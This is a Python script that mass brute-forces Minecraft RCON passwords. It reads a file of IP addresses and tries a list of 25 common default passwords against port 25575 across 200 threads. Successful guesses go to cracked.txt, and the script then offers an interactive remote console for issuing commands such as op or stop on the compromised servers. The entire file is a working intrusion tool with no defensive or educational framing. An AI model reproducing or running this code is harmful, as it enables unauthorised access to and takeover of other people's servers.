import socket
import struct
import random
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

PORT = 25575
TIMEOUT = 3
THREADS = 200
PASSWORDS = [
    "minecraft",
    "password", 
    "12345678",
    "admin",
    "rcon",
    "server",
    "changeme",
    "password123",
    "letmein",
    "root",
    "12345",
    "qwerty",
    "abc123",
    "minecraft123",
    "admin123",
    "rconpass",
    "123456789",
    "password1",
    "default",
    "rc0n",
    "console",
    "remote",
    "control",
    "secret",
    "1234"
]

found_lock = threading.Lock()
found_creds = []

def pck(pkt_type, body):
    body_bytes = body.encode() + b'\x00\x00'
    pkt_len = 8 + len(body_bytes)
    req_id = random.randint(1, 2**31 - 1)
    return struct.pack("<iii", pkt_len, req_id, pkt_type) + body_bytes

def recv_all(sock, size):
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data

def try_rcon(ip, password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, PORT))
        sock.sendall(pck(3, password))
        resp_len_data = recv_all(sock, 4)
        if len(resp_len_data) < 4:
            sock.close()
            return False
        resp_len = struct.unpack("<i", resp_len_data)[0]
        if resp_len > 10000:
            sock.close()
            return False
        resp_data = recv_all(sock, resp_len)
        if len(resp_data) < 8:
            sock.close()
            return False
        req_id, pkt_type = struct.unpack("<ii", resp_data[:8])
        sock.close()
        return req_id != -1
    except:
        return False

def crack_host(ip):
    global found_creds
    for pwd in PASSWORDS:
        if try_rcon(ip, pwd):
            with found_lock:
                found_creds.append(f"{ip}:{pwd}")
                print(f"[CRACKED] {ip} | {pwd}")
                with open("cracked.txt", "a") as f:
                    f.write(f"{ip}:{pwd}\n")
            return True
    print(f"[FAILED] {ip}")
    return False

def interactive_rcon(ip, password):
    print(f"\n[+] Connecting to {ip} with password: {password}")
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((ip, PORT))
        sock.sendall(pck(3, password))
        resp_len = struct.unpack("<i", recv_all(sock, 4))[0]
        resp_data = recv_all(sock, resp_len)
        req_id = struct.unpack("<i", resp_data[:4])[0]
        if req_id == -1:
            print("[-] Auth failed unexpectedly")
            return
        print(f"[+] Authenticated to {ip}")
        print("[+] Type commands (list, say, op, stop, help)")
        print("[+] Type 'quit' to disconnect\n")
        while True:
            cmd = input(f"RCON@{ip}> ")
            if cmd.lower() in ['quit', 'exit', 'q']:
                break
            sock.sendall(pck(2, cmd))
            resp_len = struct.unpack("<i", recv_all(sock, 4))[0]
            resp_data = recv_all(sock, resp_len)
            if len(resp_data) > 8:
                result = resp_data[8:-2].decode('utf-8', errors='ignore')
                print(result)
        sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rcon_cracker.py open_ips.txt")
        print("Or to connect to specific IP: python3 rcon_cracker.py -c <ip> <password>")
        sys.exit(1)
    if sys.argv[1] == "-c" and len(sys.argv) >= 4:
        interactive_rcon(sys.argv[2], sys.argv[3])
        return
    with open(sys.argv[1]) as f:
        ips = [line.strip() for line in f if line.strip()]
    print(f"[*] Loaded {len(ips)} IPs to test")
    print(f"[*] Testing {len(PASSWORDS)} passwords on each")
    print(f"[*] Using {THREADS} threads\n")
    start = time.time()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(crack_host, ip): ip for ip in ips}
        for future in as_completed(futures):
            pass 
    elapsed = time.time() - start
    print(f"\n[*] Complete in {elapsed:.1f}s")
    print(f"[*] Found {len(found_creds)} vulnerable servers")
    print(f"[*] Results saved to cracked.txt")
    if found_creds:
        print("\n[+] To connect to a cracked server:")
        print(f"    python3 {sys.argv[0]} -c <ip> <password>")

if __name__ == "__main__":
    main()